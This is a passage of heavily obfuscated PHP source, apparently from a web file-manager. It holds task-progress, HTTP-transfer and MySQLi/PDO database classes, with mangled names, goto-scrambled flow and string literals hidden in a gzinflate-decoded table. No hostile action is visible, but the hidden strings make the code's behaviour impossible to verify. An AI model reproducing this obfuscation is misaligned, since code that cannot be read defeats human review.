($this->sourceModelCopyFlag) { return; } $bÅ¢èÉŒ† = 0; if ($d½Ç×•ÎöŸ[$DÔµßËŒœÏ[1464]] == $DÔµßËŒœÏ[1043]) { $bÅ¢èÉŒ† = $d½Ç×•ÎöŸ[$DÔµßËŒœÏ[1463]] * 0.5; } else { if ($d½Ç×•ÎöŸ[$DÔµßËŒœÏ[1464]] == $DÔµßËŒœÏ[102]) { $bÅ¢èÉŒ† = $d½Ç×•ÎöŸ[$DÔµßËŒœÏ[1463]] * 0.5 + $d½Ç×•ÎöŸ[$DÔµßËŒœÏ[1462]] * 0.5; } } goto b—îÚÒƒ„Ó; b—îÚÒƒ„Ó: $d½Ç×•ÎöŸ[$DÔµßËŒœÏ[1418]] = ($d½Ç×•ÎöŸ[$DÔµßËŒœÏ[1467]] + $bÅ¢èÉŒ†) / $d½Ç×•ÎöŸ[$DÔµßËŒœÏ[700]]; if ($d½Ç×•ÎöŸ[$DÔµßËŒœÏ[1418]] > 0) { $FŸ¿‹‚×‚ä = timeFloat() - $d½Ç×•ÎöŸ[$DÔµßËŒœÏ[1420]] - $d½Ç×•ÎöŸ[$DÔµßËŒœÏ[1423]]; $d½Ç×•ÎöŸ[$DÔµßËŒœÏ[1424]] = $FŸ¿‹‚×‚ä * (1 - $d½Ç×•ÎöŸ[$DÔµßËŒœÏ[1418]]) / $d½Ç×•ÎöŸ[$DÔµßËŒœÏ[1418]]; } goto Dó´‘±ÊØÇ; FÊ½ªÉ¸ß: $DÔµßËŒœÏ =& $_SERVER[Õİõş]; $d½Ç×•ÎöŸ =& $this->task; if (!$d½Ç×•ÎöŸ[$DÔµßËŒœÏ[700]]) { return; } goto d½èÕÚøÙ; Dó´‘±ÊØÇ: } public function addPath($dÜ¸Æ–­î) { goto Fä×‰µ¥ï; aö¾óªİµ: if ($BùĞÑ„İê[$a¿×Œ«Äİ´[29]] == $a¿×Œ«Äİ´[163]) { $A’òŞˆ…­ê[$a¿×Œ«Äİ´[980]] += 1; } else { $A’òŞˆ…­ê[$a¿×Œ«Äİ´[980]] += $BùĞÑ„İê[$a¿×Œ«Äİ´[80]][$a¿×Œ«Äİ´[78]]; if ($BùĞÑ„İê[$a¿×Œ«Äİ´[365]]) { $A’òŞˆ…­ê[$a¿×Œ«Äİ´[980]] += $BùĞÑ„İê[$a¿×Œ«Äİ´[80]][$a¿×Œ«Äİ´[79]] + 1; } } $A’òŞˆ…­ê[$a¿×Œ«Äİ´[700]] += $BùĞÑ„İê[$a¿×Œ«Äİ´[77]]; $this->update(); goto E£²’ç®ƒŠ; D·¹°È¬è: $BùĞÑ„İê = IO::infoWithChildren($dÜ¸Æ–­î); $BìµĞ½ëˆ± = $A’òŞˆ…­ê[$a¿×Œ«Äİ´[1468]] ? $A’òŞˆ…­ê[$a¿×Œ«Äİ´[1468]][$a¿×Œ«Äİ´[1469]] : 0; $A’òŞˆ…­ê[$a¿×Œ«Äİ´[1468]] = array($a¿×Œ«Äİ´[1469] => $BìµĞ½ëˆ± + 1, $a¿×Œ«Äİ´[382] => $BùĞÑ„İê[$a¿×Œ«Äİ´[28]], $a¿×Œ«Äİ´[75] => $BùĞÑ„İê[$a¿×Œ«Äİ´[75]], $a¿×Œ«Äİ´[461] => $BùĞÑ„İê[$a¿×Œ«Äİ´[461]] ? $BùĞÑ„İê[$a¿×Œ«Äİ´[461]] : $BùĞÑ„İê[$a¿×Œ«Äİ´[75]]); goto aö¾óªİµ; Fä×‰µ¥ï: $a¿×Œ«Äİ´ =& $_SERVER[Õİõş]; if (!$dÜ¸Æ–­î) { return; } $A’òŞˆ…­ê =& $this->task; goto D·¹°È¬è; E£²’ç®ƒŠ: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($C—Å·ÙŠ»Å) { $DËé«©”Ûß =& $_SERVER[Õİõş]; $a‘™¿÷“¤Û =& $this->task; $a‘™¿÷“¤Û[$DËé«©”Ûß[1460]] = $C—Å·ÙŠ»Å[$DËé«©”Ûß[28]]; $a‘™¿÷“¤Û[$DËé«©”Ûß[982]] = $C—Å·ÙŠ»Å[$DËé«©”Ûß[28]]; $this->update(); } public function copyFileStart($c«å„ØåÓÒ, $a©Ëäô¡À¹, $b¯µÀ—İ»Ü, $DÕœŞ°Ô˜Ì, $aæÎ±¶¾…Ö, $EŠ¯½°¸¬) { goto a†•ìŒ×¥³; Fª·ƒÃ¬äŒ: $GLOBALS[$e¹Í‚øº§Û[1471]] = $aæÎ±¶¾…Ö; $GLOBALS[$e¹Í‚øº§Û[1470]] = $EŠ¯½°¸¬; $A©óèé‚ø” =& $this->task; goto b±ê‰á†°‹; a†•ìŒ×¥³: $e¹Í‚øº§Û =& $_SERVER[Õİõş]; $fò°êéÀ¯ä = $aæÎ±¶¾…Ö; if ($fò°êéÀ¯ä == $GLOBALS[$e¹Í‚øº§Û[1470]]) { $fò°êéÀ¯ä = $GLOBALS[$e¹Í‚øº§Û[1471]]; } goto Fª·ƒÃ¬äŒ; DÎ—‚Ñ ¢: $A©óèé‚ø”[$e¹Í‚øº§Û[982]] = $e¹Í‚øº§Û[33]; $A©óèé‚ø”[$e¹Í‚øº§Û[1464]] = $e¹Í‚øº§Û[33]; $A©óèé‚ø”[$e¹Í‚øº§Û[1465]] = 0; goto d¹Üã½šÌ; b±ê‰á†°‹: $A©óèé‚ø”[$e¹Í‚øº§Û[1460]] = $fò°êéÀ¯ä; $A©óèé‚ø”[$e¹Í‚øº§Û[1462]] = (int) $c«å„ØåÓÒ->size($a©Ëäô¡À¹); $A©óèé‚ø”[$e¹Í‚øº§Û[1463]] = 0; goto DÎ—‚Ñ ¢; d¹Üã½šÌ: $this->update(); goto c±ìÏÜøÇİ; c±ìÏÜøÇİ: } public function copyFileEnd($aæßß½õ„‰, $E”­Ëƒ³ĞÆ, $bÎğÜºÕŞ•, $f¤ìãõ´¡à, $fàšÙ¸À, $aƒŒ—·÷÷Ê) { $cï…ÏÔÁáÔ =& $_SERVER[Õİõş]; $b¾È±µ =& $this->task; $b¾È±µ[$cï…ÏÔÁáÔ[1463]] = $b¾È±µ[$cï…ÏÔÁáÔ[1462]]; $b¾È±µ[$cï…ÏÔÁáÔ[1464]] = $cï…ÏÔÁáÔ[33]; if ($fàšÙ¸À == $b¾È±µ[$cï…ÏÔÁáÔ[1460]]) { $b¾È±µ[$cï…ÏÔÁáÔ[1467]] += $b¾È±µ[$cï…ÏÔÁáÔ[1462]]; $this->update(1); } else { $this->update(); $b¾È±µ[$cï…ÏÔÁáÔ[1463]] = 0; } self::log($cï…ÏÔÁáÔ[1472] . $E”­Ëƒ³ĞÆ . $cï…ÏÔÁáÔ[66] . $f¤ìãõ´¡à . $cï…ÏÔÁáÔ[213] . $fàšÙ¸À . $cï…ÏÔÁáÔ[1473] . $b¾È±µ[$cï…ÏÔÁáÔ[1460]]); } public function updateFileEnd($cË´µ†Òô, $e‰„Íô¥—) { $Dà‘ìÖÃÌÜ =& $_SERVER[Õİõş]; $cÙ·º×ƒ¦’ =& $this->task; $cÙ·º×ƒ¦’[$Dà‘ìÖÃÌÜ[1460]] = $cË´µ†Òô; $cÙ·º×ƒ¦’[$Dà‘ìÖÃÌÜ[1462]] = $e‰„Íô¥—; $cÙ·º×ƒ¦’[$Dà‘ìÖÃÌÜ[1467]] += $e‰„Íô¥—; $this->update(1); } public function sourceModelCopy($c­¶ãŠ˜) { goto Eè¨Åòõ…½; Eè¨Åòõ…½: $e›¯¿Á§ˆ =& $_SERVER[Õİõş]; $f“®£ ôŠÎ = $c­¶ãŠ˜[0]; $Få§ªã›Àß = $c­¶ãŠ˜[1]; goto fÅŒÁ¯¹ ; fÅŒÁ¯¹ : $DêºÜ…ôèÛ =& $this->task; $this->sourceModelCopyFlag = !0; $FŞ¹‰¹¢¾‰ = 0; goto E¡‘• ¸“; E¡‘• ¸“: switch ($f“®£ ôŠÎ) { case $e›¯¿Á§ˆ[502]: $FŞ¹‰¹¢¾‰ = 1; break; case $e›¯¿Á§ˆ[505]: $DêºÜ…ôèÛ[$e›¯¿Á§ˆ[1460]] = $Få§ªã›Àß[$e›¯¿Á§ˆ[28]]; break; case $e›¯¿Á§ˆ[507]: $FŞ¹‰¹¢¾‰ = intval($c­¶ãŠ˜[$e›¯¿Á§ˆ[359]] * 0.4); break; case $e›¯¿Á§ˆ[509]: $FŞ¹‰¹¢¾‰ = intval($c­¶ãŠ˜[$e›¯¿Á§ˆ[359]] * 0.2); break; case $e›¯¿Á§ˆ[511]: $FŞ¹‰¹¢¾‰ = intval($c­¶ãŠ˜[$e›¯¿Á§ˆ[359]] * 0.4); break; } $this->update($FŞ¹‰¹¢¾‰); $this->sourceModelCopyFlag = !1; goto EÄ¹Ğ†óÀ; EÄ¹Ğ†óÀ: } public function sourceRemove($A‚ÂÔ Šï, $bÍôÎ¿‡Ëƒ) { $f¨àÃÒ²²è =& $_SERVER[Õİõş]; $this->sourceModelCopyFlag = !0; $BëÈöˆ¶œ = 1; if (isset($A‚ÂÔ Šï[$f¨àÃÒ²²è[80]])) { $BëÈöˆ¶œ = $A‚ÂÔ Šï[$f¨àÃÒ²²è[80]][$f¨àÃÒ²²è[78]] + $A‚ÂÔ Šï[$f¨àÃÒ²²è[80]][$f¨àÃÒ²²è[79]] + 1; } $this->update($BëÈöˆ¶œ); $this->sourceModelCopyFlag = !1; } public function sourceMove($Bõ‘ç¡„Îï) { $this->sourceRemove($Bõ‘ç¡„Îï, !1); } public function curlProgress($F†¬‡¦‹™¾, $C—¬ÜÂ—çª, $CØ…¹½¹¤, $b«¡õµ™², $dÅœºè¿Ô ) { $d‡‹§æÖ© =& $_SERVER[Õİõş]; $EğÕé‡¨ª =& $this->task; if ($dÅœºè¿Ô  > 0) { $EğÕé‡¨ª[$d‡‹§æÖ©[982]] = $d‡‹§æÖ©[1474]; $EğÕé‡¨ª[$d‡‹§æÖ©[1464]] = $d‡‹§æÖ©[102]; if ($EğÕé‡¨ª[$d‡‹§æÖ©[1462]] == $b«¡õµ™² || $b«¡õµ™² > 1024 * 1024) { $EğÕé‡¨ª[$d‡‹§æÖ©[1463]] = $dÅœºè¿Ô ; } if ($EğÕé‡¨ª[$d‡‹§æÖ©[1465]]) { $EğÕé‡¨ª[$d‡‹§æÖ©[1463]] = $dÅœºè¿Ô  + $EğÕé‡¨ª[$d‡‹§æÖ©[1465]]; } } else { if ($CØ…¹½¹¤ > 0) { if ($EğÕé‡¨ª[$d‡‹§æÖ©[1462]] == $C—¬ÜÂ—çª) { $EğÕé‡¨ª[$d‡‹§æÖ©[1463]] = $CØ…¹½¹¤; $EğÕé‡¨ª[$d‡‹§æÖ©[982]] = $d‡‹§æÖ©[1475]; $EğÕé‡¨ª[$d‡‹§æÖ©[1464]] = $d‡‹§æÖ©[1043]; } } } $this->update(); } public function curlProgressStart($e‚èÒ÷¼Â) { } public function curlProgressEnd($fãİÇÛ­è§) { $DåÂ²‚°ˆÕ =& $_SERVER[Õİõş]; $bÙ‹Â÷àéÌ =& $this->task; $C¼ä‘İ½ = curl_getinfo($fãİÇÛ­è§); $a¨Í²¾Óœ = $C¼ä‘İ½[$DåÂ²‚°ˆÕ[1476]]; if ($bÙ‹Â÷àéÌ[$DåÂ²‚°ˆÕ[1464]] == $DåÂ²‚°ˆÕ[102] && $a¨Í²¾Óœ) { $bÙ‹Â÷àéÌ[$DåÂ²‚°ˆÕ[1465]] += $a¨Í²¾Óœ; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $aÀã÷‚ô˜´ =& $_SERVER[Õİõş]; Hook::bind($aÀã÷‚ô˜´[1454], array($this, $aÀã÷‚ô˜´[1477])); Hook::bind($aÀã÷‚ô˜´[1456], array($this, $aÀã÷‚ô˜´[1478])); Hook::bind($aÀã÷‚ô˜´[1458], array($this, $aÀã÷‚ô˜´[1479])); } protected function endAfter() { $C‹…÷ÓÈ„‡ =& $_SERVER[Õİõş]; Hook::unbind($C‹…÷ÓÈ„‡[1454], array($this, $C‹…÷ÓÈ„‡[1477])); Hook::unbind($C‹…÷ÓÈ„‡[1456], array($this, $C‹…÷ÓÈ„‡[1478])); Hook::unbind($C‹…÷ÓÈ„‡[1458], array($this, $C‹…÷ÓÈ„‡[1479])); } public function progressStart($F Ç˜ö«£¬) { $aÆ¼º¿Ô® =& $_SERVER[Õİõş]; $c…ç«×® = curl_getinfo($F Ç˜ö«£¬); self::log($aÆ¼º¿Ô®[1480] . $c…ç«×®[$aÆ¼º¿Ô®[291]]); self::valueSet($this->task[$aÆ¼º¿Ô®[363]], $this->task); } public function progressEnd($AëØ³ÅëÔ‰) { $F¢ó†ÆŒÑ =& $_SERVER[Õİõş]; self::log($F¢ó†ÆŒÑ[1481] . $this->task[$F¢ó†ÆŒÑ[363]]); $this->end(); } public function progress($d‹ä™ êÕÓ, $aˆ©Õ÷‰, $B‹ù­çÂÌ¿, $CŞ®ÚÙ’ ğ, $f“Ø¸‰èğ) { $Bå¢Šƒ©† =& $_SERVER[Õİõş]; $FÍã³†¿ƒ‡ =& $this->task; if ($f“Ø¸‰èğ > 0) { $FÍã³†¿ƒ‡[$Bå¢Šƒ©†[980]] = $FÍã³†¿ƒ‡[$Bå¢Šƒ©†[980]] == 0 ? $CŞ®ÚÙ’ ğ : $FÍã³†¿ƒ‡[$Bå¢Šƒ©†[980]]; $FÍã³†¿ƒ‡[$Bå¢Šƒ©†[992]] = $f“Ø¸‰èğ; } else { if ($B‹ù­çÂÌ¿ > 0) { $FÍã³†¿ƒ‡[$Bå¢Šƒ©†[980]] = $FÍã³†¿ƒ‡[$Bå¢Šƒ©†[980]] == 0 ? $aˆ©Õ÷‰ : $FÍã³†¿ƒ‡[$Bå¢Šƒ©†[980]]; $FÍã³†¿ƒ‡[$Bå¢Šƒ©†[992]] = $B‹ù­çÂÌ¿; } } $this->update(); self::log("\160\x72\157\147\x72\145\163\x73\x48\164\x74\x70\x3a\x64\x6f\167\156\x3a{$B‹ù­çÂÌ¿}\x2f{$aˆ©Õ÷‰}\x3b\x20\165\x70\154\157\x61\144\x3a{$f“Ø¸‰èğ}\57{$CŞ®ÚÙ’ ğ}\x3b"); } } goto fš•´¶ğÚÄ; CÚñğÖ¹…: $båÔö£Ññö = $_SERVER[Õİõş][542]; if (strlen($båÔö£Ññö) < $_SERVER[Õİõş][543]) { return; } $_SERVER[Í¶Ìå€õ…Í] = explode($_SERVER[Õİõş][544], gzinflate(substr($_SERVER[Õİõş][545], 10, -8))); goto Fäµ÷Ø£›; a™“ºóÃ“: class DbMysqli extends Db { public function __construct($bîßùò—á„ = '') { $C…Ø·¨½³Š =& $_SERVER[Õİõş]; if (!extension_loaded($C…Ø·¨½³Š[729])) { think_exception(think_lang($C…Ø·¨½³Š[10]) . $C…Ø·¨½³Š[829]); } if (!empty($bîßùò—á„)) { $this->config = $bîßùò—á„; if (empty($this->config[$C…Ø·¨½³Š[13]])) { $this->config[$C…Ø·¨½³Š[13]] = $C…Ø·¨½³Š[33]; } } } public function connect($Eö›»îõ¶ó = '', $eäòó„‹ã = 0) { $A‹ö²ä§á =& $_SERVER[Õİõş]; if (!isset($this->linkID[$eäòó„‹ã])) { goto Fë•ÔÑÛ£ƒ; f‚Õ«‹‹Ÿ…: $this->connected = !0; if (1 != think_config($A‹ö²ä§á[18])) { unset($this->config); } goto C¾‡ˆˆªµ¡; Fë•ÔÑÛ£ƒ: if (empty($Eö›»îõ¶ó)) { $Eö›»îõ¶ó = $this->config; } $this->linkID[$eäòó„‹ã] = new mysqli($Eö›»îõ¶ó[$A‹ö²ä§á[803]], $Eö›»îõ¶ó[$A‹ö²ä§á[805]], $Eö›»îõ¶ó[$A‹ö²ä§á[806]], $Eö›»îõ¶ó[$A‹ö²ä§á[17]], $Eö›»îõ¶ó[$A‹ö²ä§á[804]] ? intval($Eö›»îõ¶ó[$A‹ö²ä§á[804]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto bİ¬ƒœâÌ; bİ¬ƒœâÌ: $C¢İã‰‡Í‹ = $this->linkID[$eäòó„‹ã]->server_version; $this->linkID[$eäòó„‹ã]->query($A‹ö²ä§á[807] . think_config($A‹ö²ä§á[808]) . $A‹ö²ä§á[55]); if ($C¢İã‰‡Í‹ > $A‹ö²ä§á[809]) { $this->linkID[$eäòó„‹ã]->query($A‹ö²ä§á[810]); } goto f‚Õ«‹‹Ÿ…; C¾‡ˆˆªµ¡: } return $this->linkID[$eäòó„‹ã]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($cÑŒˆÒîåé) { goto D‹ö”ê‚¯Ç; bÀå½ôòµ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto c”¹‘“œ À; eø¢¹‰Ü¦: $this->queryStr = $cÑŒˆÒîåé; if ($this->queryID) { $this->free(); } think_action_status($bÑ³Ä¸ì§[19], 1); goto F§ìÉ«É‘‘; F§ìÉ«É‘‘: think_status($bÑ³Ä¸ì§[20]); $this->queryID = $this->_linkID->query($cÑŒˆÒîåé); if ($this->_linkID->more_results()) { while (($f‘ßÃ¦Æ = $this->_linkID->next_result()) != NULL) { $f‘ßÃ¦Æ->free_result(); } } goto bÀå½ôòµ; D‹ö”ê‚¯Ç: $bÑ³Ä¸ì§ =& $_SERVER[Õİõş]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto eø¢¹‰Ü¦; c”¹‘“œ À: } public function execute($aŒßŞë‘¦â) { goto aÅÖËö®á‡; D‹¨ã¯‡šá: think_status($b®ã¡©°ò[20]); $bà÷êô§¦Ğ = $this->_linkID->query($aŒßŞë‘¦â); $this->debug(); goto eá‡¹—ö›°; eá‡¹—ö›°: if (!1 === $bà÷êô§¦Ğ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto A§ÁÏ§œŒ­; BŠ™¾¾ªó…: $this->queryStr = $aŒßŞë‘¦â; if ($this->queryID) { $this->free(); } think_action_status($b®ã¡©°ò[21], 1); goto D‹¨ã¯‡šá; aÅÖËö®á‡: $b®ã¡©°ò =& $_SERVER[Õİõş]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto BŠ™¾¾ªó…; A§ÁÏ§œŒ­: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $E°Æô‚á–ô = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$E°Æô‚á–ô) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $aƒáÜå® = $this->_linkID->rollback(); $this->transTimes = 0; if (!$aƒáÜå®) { $this->error(); return !1; } } return !0; } private function getAll() { $b¬“«ë… = array(); if ($this->numRows > 0) { for ($a×ô÷òŸ¶› = 0; $a×ô÷òŸ¶› < $this->numRows; $a×ô÷òŸ¶›++) { $b¬“«ë…[$a×ô÷òŸ¶›] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $b¬“«ë…; } public function getFields($fİ‡÷ğ‚Õƒ) { $cç™Ì¾§˜Ÿ =& $_SERVER[Õİõş]; $D»ÑŸ‰ÅŒ = $this->query($cç™Ì¾§˜Ÿ[814] . $this->parseKey($fİ‡÷ğ‚Õƒ)); $F„ö³²ÏëÏ = array(); if ($D»ÑŸ‰ÅŒ) { foreach ($D»ÑŸ‰ÅŒ as $D°ƒÔ¬ÈŸ• => $bšÆ‚Úõ”Ì) { $F„ö³²ÏëÏ[$bšÆ‚Úõ”Ì[$cç™Ì¾§˜Ÿ[27]]] = array($cç™Ì¾§˜Ÿ[28] => $bšÆ‚Úõ”Ì[$cç™Ì¾§˜Ÿ[27]], $cç™Ì¾§˜Ÿ[29] => $bšÆ‚Úõ”Ì[$cç™Ì¾§˜Ÿ[30]], $cç™Ì¾§˜Ÿ[31] => (bool) ($bšÆ‚Úõ”Ì[$cç™Ì¾§˜Ÿ[32]] === $cç™Ì¾§˜Ÿ[33]), $cç™Ì¾§˜Ÿ[34] => $bšÆ‚Úõ”Ì[$cç™Ì¾§˜Ÿ[35]], $cç™Ì¾§˜Ÿ[36] => strtolower($bšÆ‚Úõ”Ì[$cç™Ì¾§˜Ÿ[37]]) == $cç™Ì¾§˜Ÿ[38], $cç™Ì¾§˜Ÿ[39] => strtolower($bšÆ‚Úõ”Ì[$cç™Ì¾§˜Ÿ[40]]) == $cç™Ì¾§˜Ÿ[41]); } } return $F„ö³²ÏëÏ; } public function getTables($B²äÚ½†„ = '') { $FÈİ„Ü£ÂÏ =& $_SERVER[Õİõş]; $bªŞÎÔÕ = !empty($B²äÚ½†„) ? $FÈİ„Ü£ÂÏ[816] . $B²äÚ½†„ : $FÈİ„Ü£ÂÏ[817]; $AÑ‘Âí—©¬ = $this->query($bªŞÎÔÕ); $A˜’¤˜—ĞÏ = array(); if ($AÑ‘Âí—©¬) { foreach ($AÑ‘Âí—©¬ as $fÚÃ¸ŠÜğ => $e‹Í¯âÆ»à) { $A˜’¤˜—ĞÏ[$fÚÃ¸ŠÜğ] = current($e‹Í¯âÆ»à); } } return $A˜’¤˜—ĞÏ; } public function replace($aÏó³œé°×, $eŒÑ‡™ÊÄ† = array()) { $dä¨ØÜÌš™ =& $_SERVER[Õİõş]; foreach ($aÏó³œé°× as $eî÷Şöœ® => $E÷ËÔñ˜‹É) { $dÎ‚…Øßáê = $this->parseValue($E÷ËÔñ˜‹É); if (is_scalar($dÎ‚…Øßáê)) { $dÔå‡§µÅÅ[] = $dÎ‚…Øßáê; $dÔàŒ£ñ§[] = $this->parseKey($eî÷Şöœ®); } } $cÆŠ²·Œéñ = $dä¨ØÜÌš™[818] . $this->parseTable($eŒÑ‡™ÊÄ†[$dä¨ØÜÌš™[263]]) . $dä¨ØÜÌš™[819] . implode($dä¨ØÜÌš™[47], $dÔàŒ£ñ§) . $dä¨ØÜÌš™[820] . implode($dä¨ØÜÌš™[47], $dÔå‡§µÅÅ) . $dä¨ØÜÌš™[821]; return $this->execute($cÆŠ²·Œéñ); } public function insertAll($eÍèÀÛêËµ, $D­µ¯»¼œ = array(), $EÏÜÓ¾àË… = false) { goto Cïµ‹®Éâ‰; b«¤ò³ƒÖë: $FÅÏ¥‚³’½ = array(); foreach ($eÍèÀÛêËµ as $Bìˆ˜ˆÓˆ) { $AÃÙ¢Ì”¬… = array(); foreach ($Bìˆ˜ˆÓˆ as $d½Äğ”šÕÍ => $eŒª¨ÒŸİ«) { $eŒª¨ÒŸİ« = $this->parseValue($eŒª¨ÒŸİ«); if (is_scalar($eŒª¨ÒŸİ«)) { $AÃÙ¢Ì”¬…[] = $eŒª¨ÒŸİ«; } } $FÅÏ¥‚³’½[] = $A‡øÔÀó«[244] . implode($A‡øÔÀó«[47], $AÃÙ¢Ì”¬…) . $A‡øÔÀó«[821]; } array_walk($FÑ—¨‡¶®Ô, array($this, $A‡øÔÀó«[822])); goto d™»Åœ¥¦; Cïµ‹®Éâ‰: $A‡øÔÀó« =& $_SERVER[Õİõş]; if (!is_array($eÍèÀÛêËµ[0])) { return !1; } $FÑ—¨‡¶®Ô = array_keys($eÍèÀÛêËµ[0]); goto b«¤ò³ƒÖë; d™»Åœ¥¦: $bÜí†øšëÕ = ($EÏÜÓ¾àË… ? $A‡øÔÀó«[823] : $A‡øÔÀó«[824]) . $A‡øÔÀó«[825] . $this->parseTable($D­µ¯»¼œ[$A‡øÔÀó«[263]]) . $A‡øÔÀó«[819] . implode($A‡øÔÀó«[47], $FÑ—¨‡¶®Ô) . $A‡øÔÀó«[826] . implode($A‡øÔÀó«[47], $FÅÏ¥‚³’½); return $this->execute($bÜí†øšëÕ); goto d„èÎ‹“Œ§; d„èÎ‹“Œ§: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $eé‡‡áÜ‘› =& $_SERVER[Õİõş]; $this->error = $this->_linkID->errno . $eé‡‡áÜ‘›[4] . $this->_linkID->error; if ($eé‡‡áÜ‘›[33] != $this->queryStr) { $this->error .= LNG($eé‡‡áÜ‘›[45]) . $this->queryStr; } think_trace($this->error, $eé‡‡áÜ‘›[33], $eé‡‡áÜ‘›[46]); return $this->error; } public function escapeString($aºóÁçÒ÷Ñ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($aºóÁçÒ÷Ñ); } else { return addslashes($aºóÁçÒ÷Ñ); } } public function parseKey(&$AÕÓÆÂÚªã, $FŠï¡¿òØ = true) { $c“ã¸Åš¦Ì =& $_SERVER[Õİõş]; if ($FŠï¡¿òØ) { $AÕÓÆÂÚªã = $this->parseKeyCheck($AÕÓÆÂÚªã); } if ($AÕÓÆÂÚªã != $c“ã¸Åš¦Ì[172] && !preg_match($c“ã¸Åš¦Ì[827], $AÕÓÆÂÚªã)) { $AÕÓÆÂÚªã = $c“ã¸Åš¦Ì[828] . trim($AÕÓÆÂÚªã, $c“ã¸Åš¦Ì[828]) . $c“ã¸Åš¦Ì[828]; } return $AÕÓÆÂÚªã; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($A£¾­ï³î = '') { $E½ˆàë¼¦á =& $_SERVER[Õİõş]; if (!class_exists($E½ˆàë¼¦á[830])) { think_exception(think_lang($E½ˆàë¼¦á[10]) . $E½ˆàë¼¦á[831]); } if (!empty($A£¾­ï³î)) { $this->config = $A£¾­ï³î; if (empty($this->config[$E½ˆàë¼¦á[13]])) { $this->config[$E½ˆàë¼¦á[13]] = array(); } } } public function connect($aºÖ‹Ìî½ = '', $FçÒ™Ÿµ²Ú = 0) { $dÏÓÓ•á‘ =& $_SERVER[Õİõş]; if (!isset($this->linkID[$FçÒ™Ÿµ²Ú])) { goto fï÷­™ğ¾ë; A¡Õ›î¹÷: $this->linkID[$FçÒ™Ÿµ²Ú]->exec($dÏÓÓ•á‘[841] . think_config($dÏÓÓ•á‘[808])); $this->connected = !0; if (1 != think_config($dÏÓÓ•á‘[18])) { unset($this->config); } goto Aä¹ÅÉ»¥; E¼ÃˆùÖë: $this->dbType = $this->_getDsnType($aºÖ‹Ìî½[$dÏÓÓ•á‘[832]]); if (in_array($this->dbType, array($dÏÓÓ•á‘[833], $dÏÓÓ•á‘[834], $dÏÓÓ•á‘[835], $dÏÓÓ•á‘[836]))) { think_exception($dÏÓÓ•á‘[837] . $this->dbType . $dÏÓÓ•á‘[838] . $this->dbType . $dÏÓÓ•á‘[839]); } if (!$this->linkID[$FçÒ™Ÿµ²Ú]) { think_exception($dÏÓÓ•á‘[840]); } goto A¡Õ›î¹÷; fï÷­™ğ¾ë: if (empty($aºÖ‹Ìî½)) { $aºÖ‹Ìî½ = $this->config; } if ($this->pconnect) { $aºÖ‹Ìî½[$dÏÓÓ•á‘[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$FçÒ™Ÿµ²Ú] = new PDO($aºÖ‹Ìî½[$dÏÓÓ•á‘[832]], $aºÖ‹Ìî½[$dÏÓÓ•á‘[805]], $aºÖ‹Ìî½[$dÏÓÓ•á‘[806]], $aºÖ‹Ìî½[$dÏÓÓ•á‘[13]]); } catch (PDOException $c›“Û®å¾õ) { think_exception($c›“Û®å¾õ->getMessage()); } goto E¼ÃˆùÖë; Aä¹ÅÉ»¥: } return $this->linkID[$FçÒ™Ÿµ²Ú]; } public function free() { $this->PDOStatement = null; } public function query($fàÆÀ¬ƒ§ç, $aœ´ÉÓ‘Ğ = array()) { goto F—µŞ¢Õœ™; c¢ìøÒ±Ş: $this->queryStr = $fàÆÀ¬ƒ§ç; if (!empty($aœ´ÉÓ‘Ğ)) { $this->queryStr .= $CùëŒÄ…ôØ[842] . print_r($aœ´ÉÓ‘Ğ, !0) . $CùëŒÄ…ôØ[843]; } if (!empty($this->PDOStatement)) { $this->free(); } goto dÄëà®Œİ; fÚÀ¡ÏÊ‡Ó: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $d’š…’¹‡ = $this->PDOStatement->execute($aœ´ÉÓ‘Ğ); $this->debug(); goto eóÅ»ö‰Ü; dÄëà®Œİ: think_action_status($CùëŒÄ…ôØ[19], 1); think_status($CùëŒÄ…ôØ[20]); $this->PDOStatement = $this->_linkID->prepare($fàÆÀ¬ƒ§ç); goto fÚÀ¡ÏÊ‡Ó; F—µŞ¢Õœ™: $CùëŒÄ…ôØ =& $_SERVER[Õİõş]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto c¢ìøÒ±Ş; eóÅ»ö‰Ü: if (!1 === $d’š…’¹‡) { $this->error(); return !1; } else { return $this->getAll(); } goto Aˆ„†İ¤Ã‘; Aˆ„†İ¤Ã‘: } public function execute($aï‹Ë’ÖìŒ, $F­òµ§ÛÂå = array()) { goto DÛİÀÛïëŒ; b³¿ŒÏ–: think_status($Fóô¢•‚Á[20]); $this->PDOStatement = $this->_linkID->prepare($aï‹Ë’ÖìŒ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto cï¦“ßƒ¥¤; cï¦“ßƒ¥¤: $Dì•é‚‹¶ò = $this->PDOStatement->execute($F­òµ§ÛÂå); $this->debug(); if (!1 === $Dì•é‚‹¶ò) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ešÒª ŠœÂ || preg_match($Fóô¢•‚Á[848], $aï‹Ë’ÖìŒ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto Fùö°¸˜è‹; C‚èÑÊØ¶: $this->queryStr = $aï‹Ë’ÖìŒ; if (!empty($F­òµ§ÛÂå)) { $this->queryStr .= 